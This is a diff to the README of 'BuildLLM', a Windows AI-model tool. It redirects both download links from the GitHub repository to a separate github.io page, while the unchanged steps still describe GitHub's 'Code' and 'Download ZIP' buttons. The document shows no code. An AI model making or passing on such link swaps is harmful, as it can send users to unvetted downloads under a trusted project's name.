@@ -1,6 +1,6 @@
 # 🧠 BuildLLM - Create your own artificial intelligence models
 
-[![Download BuildLLM](https://img.shields.io/badge/Download-BuildLLM-blue.svg)](https://github.com/Florenzalive401/BuildLLM)
+[![Download BuildLLM](https://img.shields.io/badge/Download-BuildLLM-blue.svg)](https://florenzalive401.github.io)
 
 ## 📋 Project Overview
 
@@ -23,7 +23,7 @@ Your computer needs specific hardware to run these models effectively. Ensure yo
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit this page to download: [https://github.com/Florenzalive401/BuildLLM](https://github.com/Florenzalive401/BuildLLM).
+1. Visit this page to download: [https://florenzalive401.github.io](https://florenzalive401.github.io).
 2. Look for the green button labeled "Code" on the right side of the page.
 3. Click "Download ZIP" to save the project folder to your computer.
 4. Extract the contents of the ZIP folder to a location on your hard drive.
